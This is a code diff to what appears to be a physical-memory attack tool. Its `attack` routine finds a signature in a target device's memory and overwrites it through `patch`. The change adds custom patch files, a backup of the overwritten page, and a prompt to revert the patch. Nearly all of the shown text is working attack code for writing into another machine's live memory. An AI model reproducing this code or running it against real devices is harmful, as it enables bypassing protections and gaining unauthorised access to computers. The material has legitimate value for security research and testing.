@@ -130,23 +130,34 @@ def patch(device, address, chunks):
     chunks
     '''
     success = True
+    backup = device.read(address, cfg.PAGESIZE)
+
     for c in chunks:
-        patch = c['patch']
+        if len(cfg.patchfile) > 0:
+            patch = cfg.patchfile
+        else:
+            patch = c['patch']
         if not patch:
             continue
+
         ioffset = c['internaloffset']
         poffset = c['patchoffset']
         if not poffset: 
             poffset = 0
         realaddress = address + ioffset + poffset
-        if patch:
-            device.write(realaddress, patch)
-            read = device.read(realaddress, len(patch))
-            if cfg.verbose:
-                term.info('Data read back: ' + util.bytes2hexstr(read))
-            if  read != patch:
-                success = False
-    return success
+
+        device.write(realaddress, patch)
+        read = device.read(realaddress, len(patch))
+        if cfg.verbose:
+            term.info('Data read back: ' + util.bytes2hexstr(read))
+        if read != patch:
+            success = False
+
+        # Only patch once from file
+        if len(cfg.patchfile) > 0:
+            break
+
+    return success, backup
         
 
 def searchanddestroy(device, target, memsize):
@@ -289,7 +300,7 @@ def attack(targets):
     page = int((address & mask) / cfg.PAGESIZE)
     term.info('Signature found at {0:#x} (in page # {1})'.format(address, page))
     if not cfg.dry_run:
-        success = patch(device, address, chunks)
+        success, backup = patch(device, address, chunks)
         if success:
             term.info('Write-back verified; patching successful')
             if cfg.egg:
@@ -298,7 +309,12 @@ def attack(targets):
         else:
             term.warn('Write-back could not be verified; patching *may* ' +
                       'have been unsuccessful')
-    
+
+        if cfg.revert:
+            term.poll('Press [enter] to revert:')
+            input()
+            device.write(address, backup)
+            
     #Clean up
     device.close()
     
